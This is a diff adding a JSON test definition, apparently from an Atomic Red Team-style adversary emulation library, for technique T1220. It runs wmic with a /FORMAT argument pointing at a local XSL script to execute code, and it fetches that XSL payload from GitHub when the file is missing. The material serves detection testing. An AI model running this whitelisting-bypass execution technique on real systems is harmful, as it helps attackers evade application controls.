@@ -1,0 +1,92 @@
+{
+  "id": "1b237334-3e21-4a0c-8178-b8c996124988",
+  "name": "WMIC bypass using local XSL file",
+  "description": "Executes the code specified within a XSL script using a local payload.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "10fe8182-155b-41f9-966d-e23b2f86bf9e",
+      "type": "execute-command",
+      "data": {
+        "command": "wmic #{wmic_command} /FORMAT:\"#{local_xsl_file}\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "efc990b4-1e2b-4f3d-964a-423918695f6d",
+      "name": "Check dependency 1/1",
+      "description": "XSL file must exist on disk at specified location (#{local_xsl_file})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{local_xsl_file}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "26824e8f-ec20-401b-96b8-36d7e4d65d46",
+      "name": "Resolve dependency 1/1",
+      "description": "XSL file must exist on disk at specified location (#{local_xsl_file})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory (split-path \"#{local_xsl_file}\") -ErrorAction Ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl\" -OutFile \"#{local_xsl_file}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0d341ff9-fa54-4f59-983f-724a48807110",
+      "name": "Re-check dependency 1/1",
+      "description": "XSL file must exist on disk at specified location (#{local_xsl_file})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{local_xsl_file}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "efc990b4-1e2b-4f3d-964a-423918695f6d",
+      "p": "on-success",
+      "o": "10fe8182-155b-41f9-966d-e23b2f86bf9e"
+    },
+    {
+      "s": "efc990b4-1e2b-4f3d-964a-423918695f6d",
+      "p": "on-failure",
+      "o": "26824e8f-ec20-401b-96b8-36d7e4d65d46"
+    },
+    {
+      "s": "26824e8f-ec20-401b-96b8-36d7e4d65d46",
+      "p": "on-success",
+      "o": "0d341ff9-fa54-4f59-983f-724a48807110"
+    },
+    {
+      "s": "0d341ff9-fa54-4f59-983f-724a48807110",
+      "p": "on-failure",
+      "o": "10fe8182-155b-41f9-966d-e23b2f86bf9e"
+    }
+  ],
+  "tags": [
+    "T1220",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "wmic_command",
+      "type": "string",
+      "description": "WMI command to execute using wmic.exe",
+      "value": "process list"
+    },
+    {
+      "name": "local_xsl_file",
+      "type": "path",
+      "description": "Location of the test XSL script file on the local filesystem.",
+      "value": "PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl"
+    }
+  ]
+}
